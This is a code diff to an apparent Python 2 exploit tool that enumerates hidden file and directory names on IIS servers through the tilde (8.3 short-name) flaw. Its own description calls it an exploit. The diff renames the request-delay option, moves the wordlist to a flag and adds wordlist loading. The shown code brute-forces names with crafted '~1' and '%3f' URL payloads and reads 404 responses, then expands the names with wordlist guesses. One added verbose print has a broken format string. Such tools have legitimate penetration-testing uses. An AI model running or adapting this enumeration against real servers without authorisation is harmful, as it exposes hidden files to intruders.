@@ -191,7 +191,7 @@ def findExtension(url, filename):
     if resp1.code == 404:
         for char1 in chars:
             resp1a = getWebServerResponse(url+filename+'~1.'+char1+'%3f%3f/.aspx')
-            sleep(args.wait)
+            sleep(args.snooze)
             if resp1a.code == 404:  # Got the first valid char
                 print bcolors.YELLOW + '[+]  Found file:  ' + filename+' . '+char1+bcolors.ENDC
                 return filename+'.'+char1
@@ -199,11 +199,11 @@ def findExtension(url, filename):
     elif resp1.code != 404 and resp2.code == 404:
         for char1 in chars:
             resp1a = getWebServerResponse(url+filename+'~1.'+char1+'%3f%3f/.aspx')
-            sleep(args.wait)
+            sleep(args.snooze)
             if resp1a.code == 404:  # Got the first valid char
                 for char2 in chars:
                     resp2a = getWebServerResponse(url+filename+'~1.'+char1+char2+'%3f/.aspx')
-                    sleep(args.wait)
+                    sleep(args.snooze)
                     if resp2a.code == 404:  # Got the second valid char
                         print bcolors.YELLOW + '[+]  Found file:  ' +filename+' . '+char1+char2+bcolors.ENDC
                         return filename+'.'+char1+char2
@@ -211,15 +211,15 @@ def findExtension(url, filename):
     elif resp1.code != 404 and resp2.code != 404 and resp3.code == 404:
         for char1 in chars:
             resp1a = getWebServerResponse(url+filename+'~1.'+char1+'%3f%3f/.aspx')
-            sleep(args.wait)
+            sleep(args.snooze)
             if resp1a.code == 404:  # Got the first valid char
                 for char2 in chars:
                     resp2a = getWebServerResponse(url+filename+'~1.'+char1+char2+'%3f/.aspx')
-                    sleep(args.wait)
+                    sleep(args.snooze)
                     if resp2a.code == 404:  # Got the second valid char
                         for char3 in chars:
                             resp3a = getWebServerResponse(url+filename+'~1.'+char1+char2+char3+'%3f/.aspx')
-                            sleep(args.wait)
+                            sleep(args.snooze)
                             if resp3a.code == 404:  # Got the third valid char
                                 print bcolors.YELLOW + '[+]  Found file:  ' +filename+' . '+char1+char2+char3+bcolors.ENDC
                                 return filename+'.'+char1+char2+char3
@@ -261,18 +261,18 @@ def checkEightDotThreeEnum(url, check_string, dirname='/'):
     ## Note! 1-2 char filenames show up as 4-6 char 8.3 filenames due to padding with a hash
     ##       So we skip to 3 char filenames here
     for char in chars:
-        sleep(args.wait)
+        sleep(args.snooze)
         resp1 = getWebServerResponse(url+char+check_string)
         if resp1.code == 404:  # Got the first valid char
             for char2 in chars:
                 stub = char+char2
-                sleep(args.wait)
+                sleep(args.snooze)
                 resp2 = getWebServerResponse(url+stub+check_string)
                 
                 if resp2.code == 404:  # Got the second valid char
                     for char3 in chars:
                         stub = char+char2+char3
-                        sleep(args.wait)
+                        sleep(args.snooze)
                         resp3 = getWebServerResponse(url+stub+check_string)
                         
                         if resp3.code == 404:  # Got the third valid char
@@ -281,7 +281,7 @@ def checkEightDotThreeEnum(url, check_string, dirname='/'):
                             else:
                                 for char4 in chars:
                                     stub = char+char2+char3+char4
-                                    sleep(args.wait)
+                                    sleep(args.snooze)
                                     resp4 = getWebServerResponse(url+stub+check_string)
                                     
                                     if resp4.code == 404:  # Got the fourth valid char
@@ -290,7 +290,7 @@ def checkEightDotThreeEnum(url, check_string, dirname='/'):
                                         else:
                                             for char5 in chars:
                                                 stub = char+char2+char3+char4+char5
-                                                sleep(args.wait)
+                                                sleep(args.snooze)
                                                 resp5 = getWebServerResponse(url+stub+check_string)
                                                 
                                                 if resp5.code == 404:  # Got the fifth valid char
@@ -299,7 +299,7 @@ def checkEightDotThreeEnum(url, check_string, dirname='/'):
                                                     else:
                                                         for char6 in chars:
                                                             stub = char+char2+char3+char4+char5+char6
-                                                            sleep(args.wait)
+                                                            sleep(args.snooze)
                                                             resp6 = getWebServerResponse(url+stub+check_string)
 
                                                             if resp6.code == 404:  # Got the sixth valid char
@@ -358,7 +358,7 @@ def performLookups(findings, url_good):
                     else:
                         url_to_try = url_good + line + '.' + e.rstrip()
                     url_response = getWebServerResponse(url_to_try)
-                    sleep(args.wait)
+                    sleep(args.snooze)
 
                     # Pull out just the HTTP response code number
                     if hasattr(url_response, 'code'):
@@ -409,7 +409,7 @@ def performLookups(findings, url_good):
             # Here we check the response to a plain dir request AND one with default files
             url_to_try = url_good + '/' + matches + '/'
             url_response = getWebServerResponse(url_to_try)
-            if args.wait: sleep(args.wait)
+            if args.snooze: sleep(args.snooze)
 
             # Pull out just the HTTP response code number
             if hasattr(url_response, 'code'):
@@ -444,7 +444,7 @@ def performLookups(findings, url_good):
                     # Here we check the response to a plain dir request AND one with default files
                     url_to_try = url_good + '/' + matches + '/' + index_file
                     url_response = getWebServerResponse(url_to_try)
-                    if args.wait: sleep(args.wait)
+                    if args.snooze: sleep(args.snooze)
 
                     # Pull out just the HTTP response code number
                     if hasattr(url_response, 'code'):
@@ -479,9 +479,19 @@ def main():
     if args.v:
         print bcolors.PURPLE + '[+]  HTTP Response Codes: %s' % response_code + bcolors.ENDC
 
-    if args.wait != 0 :
-        print '[-]  User-supplied delay detected. Waiting %s seconds between HTTP requests.' % args.wait
+    if args.snooze != 0 :
+        print '[-]  User-supplied delay detected. Waiting %s seconds between HTTP requests.' % args.snooze
 
+    # Open the wordlist file (or try to)
+    try:
+        wordlist = open(args.wordlist,'r').readlines()
+    except (IOError) :
+        print bcolors.RED + '[!]  [Error] Can\'t read the wordlist file you entered.' + bcolors.ENDC
+        sys.exit()
+
+    if args.v:
+        print bcolors.PURPLE + '[+]  Opened wordlist successfully' % args.wordlist + bcolors.ENDC
+        
     # Check to see if the remote server is IIS and vulnerable to the Tilde issue
     check_string = checkForTildeVuln(args.url)
 
@@ -580,11 +590,11 @@ def main():
 parser = argparse.ArgumentParser(description='Exploits and expands the file names found from the tilde enumeration vuln')
 parser.add_argument('-d', dest='dirwordlist', help='an optional wordlist for directory name content')
 parser.add_argument('-f', action='store_true', default=False, help='force testing of the server even if the headers do not report it as an IIS system')
-parser.add_argument('-p', dest='proxy',default='', help='Use a proxy host:port')
+parser.add_argument('-p', dest='proxy', default='', help='Use a proxy host:port')
+parser.add_argument('-s', dest='snooze', default=0, type=float, help='time in seconds to sleep/wait between requests')
 parser.add_argument('-u', dest='url', help='URL to scan')
 parser.add_argument('-v', action='store_true', default=False, help='verbose output')
-parser.add_argument('-w', dest='wait', default=0, type=float, help='time in seconds to wait between requests')
-parser.add_argument('wordlist', help='the wordlist file')
+parser.add_argument('-w', dest='wordlist', help='the word list to be used for guessing files')
 args = parser.parse_args()
 
 # COLORIZATION OF OUTPUT
